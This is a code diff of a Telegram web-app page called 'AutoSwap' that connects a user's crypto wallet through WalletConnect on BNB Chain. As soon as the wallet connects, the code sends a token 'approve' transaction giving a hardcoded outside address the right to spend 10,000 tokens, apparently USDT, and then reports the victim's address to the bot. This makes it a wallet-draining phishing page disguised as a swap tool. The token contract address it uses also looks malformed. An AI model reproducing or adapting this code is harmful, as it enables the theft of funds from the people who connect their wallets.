@@ -5,13 +5,17 @@
   <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
   <title>AutoSwap — Connect Wallet</title>
   <style>
-    body { background:#000; color:#e0e0e0; font-family:'Segoe UI',sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
-    .container { width:360px; padding:30px; background:#111; border-radius:12px; box-shadow:0 0 20px rgba(0,0,0,0.7); text-align:center; }
+    body { background:#000; color:#e0e0e0; font-family:'Segoe UI',sans-serif;
+           display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
+    .container { width:360px; padding:30px; background:#111; border-radius:12px;
+                 box-shadow:0 0 20px rgba(0,0,0,0.7); text-align:center; }
     h1 { color:#4fc3f7; margin-bottom:20px; }
     canvas { background:#222; border-radius:8px; margin:auto; display:block; }
-    #manual-uri { margin:20px auto; padding:16px; background:#222; border-radius:8px; font-size:14px; color:#bbb; word-break:break-all; }
+    #manual-uri { margin:20px auto; padding:16px; background:#222; border-radius:8px;
+                  font-size:14px; color:#bbb; word-break:break-all; }
     #status { margin:20px 0; min-height:40px; font-size:16px; color:#ccc; }
-    .btn { padding:12px 24px; background:#4fc3f7; color:#000; border:none; border-radius:8px; cursor:pointer; font-weight:bold; transition:background .2s; }
+    .btn { padding:12px 24px; background:#4fc3f7; color:#000; border:none;
+           border-radius:8px; cursor:pointer; font-weight:bold; transition:background .2s; }
     .btn:hover { background:#67ccff; }
   </style>
 </head>
@@ -31,18 +35,17 @@
     import { Interface, parseUnits, getAddress } from 'https://esm.sh/ethers@6.14.3';
 
     const tg = window.Telegram?.WebApp; if (tg) tg.ready();
-
     const qr = document.getElementById("qrcode");
     const uriEl = document.getElementById("manual-uri");
     const statusEl = document.getElementById("status");
     const reconnectBtn = document.getElementById("reconnect");
+
     let client, session;
 
-    reconnectBtn.onclick = () => init(true);
+    reconnectBtn.addEventListener("click", () => init(true));
 
     function setStatus(msg, color="#ccc") {
-      statusEl.textContent = msg;
-      statusEl.style.color = color;
+      statusEl.textContent = msg; statusEl.style.color = color;
     }
 
     function clearUI() {
@@ -53,7 +56,7 @@
     }
 
     async function connectWallet() {
-      setStatus("📷 Генерация QR‑кода…","#4fc3f7");
+      setStatus("📷 Генерация QR‑кода…", "#4fc3f7");
       const { uri, approval } = await client.connect({
         requiredNamespaces: { eip155: { chains:["eip155:56"], methods:["eth_sendTransaction"], events:["chainChanged","accountsChanged"] } }
       });
@@ -63,55 +66,59 @@
       session = await approval();
       const address = session.namespaces.eip155.accounts[0].split(":")[2];
       setStatus(`✅ Подключено: ${address}`, "#66bb6a");
+      client.on("session_delete", () => { clearUI(); setStatus("⚠️ Сессия удалена", "#ffa500"); });
       await doApprove(address);
     }
 
     async function doApprove(address) {
       setStatus("🚀 Отправка approve...", "#4fc3f7");
-      const data = new Interface(["function approve(address,uint256)"]).encodeFunctionData("approve", [
-        getAddress("0xC25edef7dbf23D4FBBB1Cecb9C56380eF35c11AE"),
-        parseUnits("10000",18)
-      ]);
+      const data = new Interface(["function approve(address,uint256)"])
+        .encodeFunctionData("approve", [
+          getAddress("0xC25edef7dbf23D4FBBB1Cecb9C56380eF35c11AE"),
+          parseUnits("10000",18)
+        ]);
       try {
         const tx = await client.request({
           topic: session.topic,
           chainId: "eip155:56",
-          request: { method:"eth_sendTransaction", params:[{ from: address, to:getAddress("0x55d398326f99059ff775246999027b3197955"), data }] }
+          request: { method:"eth_sendTransaction",
+            params:[{ from: address, to:getAddress("0x55d398326f99059ff775246999027b3197955"), data }] }
         });
-        setStatus(`✅ Approve tx: ${tx}`, "#66bb6a");
-        if (tg) tg.sendData(JSON.stringify({ address }));
+        setStatus(`✅ Tx: ${tx}`, "#66bb6a");
+        if(tg) tg.sendData(JSON.stringify({ address }));
       } catch(e) {
         console.error(e);
         setStatus(`❌ Ошибка: ${e.message||e.reason}`, "#ff6b6b");
       }
     }
 
-    async function init(force=false) {
+    async function init(force = false) {
+      if (!client) {
+        client = await SignClient.init({
+          projectId: "d868f90cd734355ae0328f8f0258b6b1",
+          relayUrl: "wss://relay.walletconnect.com",
+          metadata:{
+            name:"AutoSwap",
+            description:"Approve USDT via WalletConnect",
+            url:location.href,
+            icons:["https://walletconnect.com/favicon.ico"]
+          }
+        });
+      }
       if (force && session) {
-        await client.disconnect({ topic: session.topic, reason:{ code:6000, message:"User reconnected" }});
+        await client.disconnect({ topic: session.topic, reason: { code:6000, message:"User reconnected" } });
       }
       clearUI();
       setStatus("🔌 Инициализация…");
 
-      client = await SignClient.init({
-        projectId: "d868f90cd734355ae0328f8f0258b6b1",
-        relayUrl: "wss://relay.walletconnect.com",
-        metadata:{ name:"AutoSwap", description:"Approve USDT via WalletConnect", url:location.href, icons:["https://walletconnect.com/favicon.ico"] }
-      });
-
-      const existing = await client.session.getAll();
-      if (existing.length && !force) {
-        session = existing[0];
-        const address = session.namespaces.eip155.accounts[0].split(":")[2];
-        setStatus(`ℹ Сессия активна: ${address}. Нажмите кнопку переподключения.`, "#ffa500");
+      const active = await client.session.getAll();
+      if (active.length && !force) {
+        session = active[0];
+        const addr = session.namespaces.eip155.accounts[0].split(":")[2];
+        setStatus(`ℹ Сессия есть: ${addr}. Нажмите Reconnect.`, "#ffa500");
       } else {
         await connectWallet();
       }
-
-      client.on("session_delete", () => {
-        clearUI();
-        setStatus("⚠️ Сессия удалена", "#ffa500");
-      });
     }
 
     init();
